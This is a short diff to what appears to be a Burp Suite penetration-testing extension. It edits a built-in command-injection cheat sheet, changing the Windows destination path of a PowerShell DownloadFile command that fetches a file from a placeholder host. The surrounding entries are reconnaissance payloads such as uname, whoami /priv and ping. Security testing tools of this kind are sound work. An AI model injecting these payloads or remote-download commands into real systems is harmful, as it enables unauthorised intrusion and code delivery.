@@ -917,7 +917,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
         self._txtCheatSheetCommandInj += "\tuname -a\t\t\t\t\t\tsysteminfo\n"
         self._txtCheatSheetCommandInj += "\t/usr/bin/id\t\t\t\t\t\twhoami /priv\n"
         self._txtCheatSheetCommandInj += "\tping -c 10 X.X.X.X\t\t\t\t\tping -n 10 X.X.X.X\n"
-        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\file.txt')\n"       
+        self._txtCheatSheetCommandInj += "\tcurl http://X.X.X.X/file.txt -o /tmp/file.txt\t\t\tpowershell (new-object System.Net.WebClient).DownloadFile('http://X.X.X.X/file.txt','C:\\users\\public\\file.txt')\n"       
         _lblDepth = JLabel("( Depth =", SwingConstants.LEFT)
         _btnGenerateDict = JButton("Generate the Payload", actionPerformed=self.funcGeneratePayload)
         self._lblStatusLabel = JLabel()
